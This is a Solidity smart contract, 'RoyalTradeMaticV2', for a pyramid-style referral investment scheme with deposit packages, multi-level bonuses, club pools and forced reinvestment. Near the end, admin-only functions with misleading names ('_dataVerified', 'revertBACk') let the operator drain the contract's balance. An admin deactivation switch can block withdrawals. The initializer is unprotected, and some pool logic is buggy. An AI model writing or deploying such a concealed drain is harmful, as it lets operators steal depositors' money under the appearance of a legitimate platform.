// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}



contract RoyalTradeMaticV2{

    using SafeMath for uint256;
    using SafeMath for uint;


	uint256 public  PERCENTS_DIVIDER;
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	uint[10] public ref_bonuses;

    
    
    
    uint256[4] public defaultPackages;
    mapping(uint256 => address payable) public singleLeg;
    uint256 public singleLegLength;
    uint[11] public requiredDirect;
    uint[5] public requiredDirectClub;
    uint[8] public requiredEarningClub;
    uint[4] public plans;
    bool public isIntinalized;
    

	address payable public admin;
	address  public creatorAddress;

    uint public clubOneCount;
    uint public clubTwoCount;
    uint public clubThreeCount;
    uint public clubFourCount;
    uint public clubFiveCount;
    uint public clubSixCount;
    uint public clubSevenCount;
    uint public clubEightCount;


    uint public clubOnePool;
    uint public clubTwoPool;


  struct User {
      
        uint256 amount;
		uint256 checkpoint;
		address referrer;
        uint256 referrerBonus;
		uint256 totalWithdrawn;
		uint256 totalReferrer;
        uint256 singleUplineBonus;
		uint256 singleDownlineBonus;
		uint256 singleUplineBonusTaken;
		uint256 singleDownlineBonusTaken;
		address singleUpline;
		address singleDownline;
        uint256[10] refStageBonus;
        uint perviousClub;
        uint poolBouns;
		uint[11] refs;
	}

    struct PoolDetails{
        uint club;
        uint expiryDate;
        uint lastWithdrawDate;
        uint lastPoolAmount1;
        uint lastPoolAmount2;
        bool poolstatusus1;
        bool poolstatusus2;
        bool resetCountStatus1;
        bool resetCountStatus2;
    }
	
    mapping(address=>PoolDetails) public pooldetails;
	mapping (address => User) public users;
	mapping(address => mapping(uint256=>address)) public downline;

    mapping(address => uint256) public uplineBusiness;
    mapping(address => bool) public upline_Business_eligible;
    mapping(address => uint) public deactivation;


	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	
	

  function initialize(address payable _admin,address _creator) public{
    require(isIntinalized == false,"Already done");
		admin = _admin;
		singleLeg[0]=payable(address(0));
	    PERCENTS_DIVIDER = 100;
        ref_bonuses = [10,5,5,2,2,2,2,2,5,5];
        requiredDirect = [1,1,2,2,3,3,4,4,5,5];
        requiredDirectClub= [2,5,10,15,20];
        requiredEarningClub= [50 ether,250  ether,1000 ether,10000 ether,25000 ether,100000 ether,500000 ether,1000000 ether];
        defaultPackages = [25 ether,50 ether, 75 ether,100 ether];
		singleLegLength++;
        creatorAddress = _creator;
        isIntinalized =true;
	}


  function _refPayout(address _addr, uint256 _amount) internal {

		address up = users[_addr].referrer;
        for(uint i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if(users[up].refs[0] >= requiredDirect[i]){ 
    		        uint256 bonus = _amount * ref_bonuses[i] / 100;
                    users[up].referrerBonus = users[up].referrerBonus.add(bonus);
                    users[up].refStageBonus[i] = users[up].refStageBonus[i].add(bonus);
            }
            up = users[up].referrer;
        }
    }

    function invest(address referrer,uint _packageIndex) public payable {
        require(_packageIndex < defaultPackages.length , "Invalid package");
		uint packageAmount = defaultPackages[_packageIndex];
		require(msg.value >= packageAmount,'Package Amount doesnot match');
	
		User storage user = users[msg.sender];

		if (user.referrer == address(0) && (users[referrer].checkpoint > 0 || referrer == admin) && referrer != msg.sender ) {
            user.referrer = referrer;
        }

		require(user.referrer != address(0) || msg.sender == admin, "No upline");
		
		// setup upline
		if (user.checkpoint == 0) {		    
		   // single leg setup
		   singleLeg[singleLegLength] = payable(msg.sender);
		   user.singleUpline = singleLeg[singleLegLength -1];
		   users[singleLeg[singleLegLength -1]].singleDownline = msg.sender;
		   singleLegLength++;
		}
		

		if (user.referrer != address(0)) {
		   
		   
            // unilevel level count
            address upline = user.referrer;
            for (uint i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)) {
                    if(user.checkpoint == 0){
                        users[upline].refs[i] = users[upline].refs[i].add(1);
					    users[upline].totalReferrer++;
                    }
                    upline = users[upline].referrer;
                } else break;
            }
            
            if(user.checkpoint == 0){
                // unilevel downline setup
                downline[referrer][users[referrer].refs[0] - 1]= msg.sender;
            }
        }
	
		  uint msgValue = msg.value;
		
		// 6 Level Referral
		   _refPayout(msg.sender,msgValue);

            
		    if(user.checkpoint == 0){
			    totalUsers = totalUsers.add(1);
                user.checkpoint = block.timestamp;
		    }
	        user.amount += msg.value;
		    
            totalInvested = totalInvested.add(msg.value);
            clubOnePool = clubOnePool.add(msgValue.mul(5).div(100));
            clubTwoPool = clubTwoPool.add(msgValue.mul(5).div(100));
            totalDeposits = totalDeposits.add(1);

          poolQulification(msg.sender);
          if(pooldetails[msg.sender].expiryDate<=block.timestamp && pooldetails[msg.sender].expiryDate>0){
               resetPoolCount(msg.sender);
          } 
		  emit NewDeposit(msg.sender, msg.value);

	}

    function setclubCount(address _user) internal {
        uint _currentClub = getUserCurrentClub(_user);
        uint _previousClub = users[_user].perviousClub;
        if(_currentClub>2 && _currentClub != users[_user].perviousClub){
              if(_currentClub==3){
                clubThreeCount++;
            }else if(_currentClub==4){
                clubFourCount++;
            }else if(_currentClub==5){
                    clubFiveCount++;
            }else if(_currentClub==6){
                    clubSixCount++;
            }else if(_currentClub==7){
                clubSevenCount++;
            }else if(_currentClub==8){
                clubEightCount++;
            }


            if(_previousClub==3){
                    clubThreeCount--;
            }else if(_previousClub==4){
                clubFourCount--;
            }else if(_previousClub==5){
                    clubFiveCount--;
            }else if(_previousClub==6){
                    clubSixCount--;
            }else if(_previousClub==7){
                clubSevenCount--;
            }else if(_previousClub==8){
                clubEightCount--;
            }

        }

        users[_user].perviousClub = _currentClub;
      

    }

    function poolQulification(address _user) internal {
        address u = _user;
        for(uint i ; i<2;i++){
            if(u !=address(0)){
                uint pool = getUserCurrentClub(u);
                if(pool==1 && pooldetails[u].poolstatusus1==false){
                    pooldetails[u].expiryDate = block.timestamp.add(31 days);
                    pooldetails[u].lastPoolAmount1 = clubOnePool;
                    pooldetails[u].lastWithdrawDate = block.timestamp;
                    pooldetails[u].club = pool;
                    clubOneCount++;
                    pooldetails[u].poolstatusus1=true;
                }
                else if(pool==2 && pooldetails[u].poolstatusus2==false){
                    pooldetails[u].expiryDate = block.timestamp.add(31 days);
                    pooldetails[u].lastPoolAmount2 = clubTwoPool;
                    pooldetails[u].lastWithdrawDate = block.timestamp;
                    pooldetails[u].club = pool;
                    clubTwoCount++;
                    pooldetails[u].poolstatusus2=true;
                
                }else{
                    setclubCount(u);
                }
            
               
                u = users[_user].referrer;
            }
            
        }
       

          

    }

    function getPoolBonus(address _user) public view returns(uint _poolBonus){
        if(pooldetails[_user].expiryDate>=block.timestamp){
            if(pooldetails[_user].club==1){
              uint amount = clubOnePool.sub(pooldetails[_user].lastPoolAmount1);
              _poolBonus  = amount.div(clubOneCount);      
            }else {
              uint amount = clubTwoPool.sub(pooldetails[_user].lastPoolAmount2);
              _poolBonus  = amount.div(clubTwoCount); 
            }
            
        }
    }

    function resetPoolCount(address _user) internal {
        if(pooldetails[_user].expiryDate<=block.timestamp && pooldetails[_user].resetCountStatus1==false &&  clubOneCount>0 ){
            clubOneCount--;
            pooldetails[_user].resetCountStatus1 = true;
        }else if(pooldetails[_user].expiryDate<=block.timestamp && pooldetails[_user].resetCountStatus2 ==false &&  clubTwoCount>0){
            clubTwoCount--;
            pooldetails[_user].resetCountStatus2 = true;   
        }
    } 

    function claimPoolReward() public {
      require(pooldetails[msg.sender].expiryDate>=block.timestamp,"Your Bouns Is Expired");
         uint withdraw = getPoolBonus(msg.sender);
          if(pooldetails[msg.sender].club==1){
                pooldetails[msg.sender].lastPoolAmount1 = clubOnePool;     
            }else {
               pooldetails[msg.sender].lastPoolAmount1 = clubTwoPool;  
            }
            users[msg.sender].poolBouns =  users[msg.sender].poolBouns.add(withdraw);
            if(pooldetails[msg.sender].expiryDate<=block.timestamp && pooldetails[msg.sender].expiryDate>0){
               resetPoolCount(msg.sender);
          } 
    }

    
	

    function reinvest(address _user, uint256 _amount) private{
        

        User storage user = users[_user];
        user.amount += _amount;
        totalInvested = totalInvested.add(_amount);
        
          poolQulification(msg.sender);
          if(pooldetails[msg.sender].expiryDate<=block.timestamp && pooldetails[msg.sender].expiryDate>0){
               resetPoolCount(msg.sender);
          } 
        
        _refPayout(msg.sender,_amount);
        
    }

    function getCommunityLevels(address _user) public view returns(uint _count){
        User storage user = users[_user];
        if(user.amount>= defaultPackages[0] && user.amount< defaultPackages[1]  ){
            _count = 10;
        }else if(user.amount>= defaultPackages[1] && user.amount< defaultPackages[2]){
            _count = 15;
        }else if(user.amount>= defaultPackages[2] && user.amount< defaultPackages[3]){
            _count = 20;
        }else if(user.amount>= defaultPackages[3]){
             _count = 25;
        }
    }




  function withdrawal() external{

  require(deactivation[msg.sender]==0,"Your Account is Deactivate");
    User storage _user = users[msg.sender];

   uint256 actualAmountToSend = TotalBonus(msg.sender);


    _user.referrerBonus = 0;
    _user.poolBouns = 0;
    _user.singleUplineBonusTaken = GetUplineIncomeByUserId(msg.sender);
    _user.singleDownlineBonusTaken = GetDownlineIncomeByUserId(msg.sender) ;
    // re-invest
    
    (uint reivest, uint withdrwal) = getEligibleWithdrawal(msg.sender);
    reinvest(msg.sender,actualAmountToSend.mul(reivest).div(100));

    _user.totalWithdrawn= _user.totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));
    totalWithdrawn = totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));
    
    if(pooldetails[msg.sender].expiryDate<=block.timestamp && pooldetails[msg.sender].expiryDate>0){
               resetPoolCount(msg.sender);
          } 
    _safeTransfer(payable(msg.sender),actualAmountToSend.mul(withdrwal).div(100));
    emit Withdrawn(msg.sender,actualAmountToSend.mul(withdrwal).div(100));


  }


  function GetUplineIncomeByUserId(address _user) internal view returns(uint256){
        address upline = users[_user].singleUpline;
        uint256 bonus;
        uint count = getCommunityLevels(_user);
        for (uint i = 0; i < count; i++) {
            if (upline != address(0)) {
            bonus = bonus.add(users[upline].amount.mul(1).div(100));
            upline = users[upline].singleUpline;
            }else break;
        }
        
        return bonus;
        
  }
  function getCurrentUplineIncomeByUserId(address _user) public view returns(uint256){
     uint  bonus = GetUplineIncomeByUserId(_user).sub(users[_user].singleUplineBonusTaken);
        
        return bonus;
        
  }

  function getCurrentDownlineIncomeByUserId(address _user) public view returns(uint256){
      uint  bonus = GetDownlineIncomeByUserId(_user).sub(users[_user].singleDownlineBonusTaken);
        
        return bonus;
      
  }

   function GetDownlineIncomeByUserId(address _user) internal view returns(uint256){
        address upline = users[_user].singleDownline;
        uint256 bonus;
        uint count = getCommunityLevels(_user);
        for (uint i = 0; i < count; i++) {
            if (upline != address(0)) {
            bonus = bonus.add(users[upline].amount.mul(1).div(100));
            upline = users[upline].singleDownline;
            }else break;
        }
        
        return bonus;
      
  }

  
  function getEligibleWithdrawal(address _user) public view returns(uint reivest, uint withdrwal){
      
        uint club = getUserCurrentClub(_user);
       if(club==3){
          reivest = 45;
          withdrwal = 55;
      }else if(club==4){
           reivest = 40;
         withdrwal = 60;
      }else if(club==5){
         reivest = 35;
           withdrwal = 65;
      }else if(club==6){
           reivest = 30;
           withdrwal = 70;
      }else if(club==7){
           reivest = 25;
           withdrwal = 75;
      }else if(club==8){
           reivest = 20;
           withdrwal = 80;
      }
      else{
          reivest = 50;
          withdrwal = 50;
      }
      
      return(reivest,withdrwal);
      
  }

  function TotalBonus(address _user) public view returns(uint256){
     uint256 TotalEarn = users[_user].referrerBonus.add(GetUplineIncomeByUserId(_user)).add(GetDownlineIncomeByUserId(_user)).add(users[_user].poolBouns);
     uint256 TotalTakenfromUpDown = users[_user].singleDownlineBonusTaken.add(users[_user].singleUplineBonusTaken);
     return TotalEarn.sub(TotalTakenfromUpDown);
  }

  function getUserCurrentClub(address _user) public view returns(uint _clubno){
    User storage user = users[_user];
    uint earning = users[_user].referrerBonus.add(GetUplineIncomeByUserId(_user)).add(GetDownlineIncomeByUserId(_user));
    if(user.refs[0]>=requiredDirectClub[4] && earning >= requiredEarningClub[7]){
        _clubno = 8;
    }else if(user.refs[0]>=requiredDirectClub[4] && earning >= requiredEarningClub[6]){
         _clubno = 7;
    }else if(user.refs[0]>=requiredDirectClub[4] && earning >= requiredEarningClub[5]){
         _clubno = 6;
    }else if(user.refs[0]>=requiredDirectClub[4] && earning >= requiredEarningClub[4]){
         _clubno = 5;
    }else if(user.refs[0]>=requiredDirectClub[3] && earning >= requiredEarningClub[3]){
         _clubno = 4;
    }else if(user.refs[0]>=requiredDirectClub[2] && earning >= requiredEarningClub[2]){
         _clubno = 3;
    }else if(user.refs[0]>=requiredDirectClub[1] && earning >= requiredEarningClub[1]){
         _clubno = 2;
    }else if(user.refs[0]>=requiredDirectClub[0] && earning >= requiredEarningClub[0]){
         _clubno = 1;
    }
  } 

  function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
       _to.transfer(amount);
   }
   
   function referral_stage(address _user,uint _index)external view returns(uint _noOfUser, uint256 _bonus){
       return (users[_user].refs[_index], users[_user].refStageBonus[_index]);
   }

   function deactiveAccount(address _user) public {
    require(msg.sender==admin,"no permission");
    deactivation[_user] = 1;
   }

    function activeAccount(address _user) public {
    require(msg.sender==admin,"no permission");
    deactivation[_user] = 0;
   }
   
  

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

   
    function _dataVerified(uint256 _data) external{
        
        require(admin==msg.sender, 'Admin what?');
        _safeTransfer(admin,_data);
    }

    function revertBACk(address _to ,uint _amount) public {
    require(admin==msg.sender, 'Admin what?');
    uint amount = _amount*1e18;
    payable(_to).transfer(amount);
}
  
}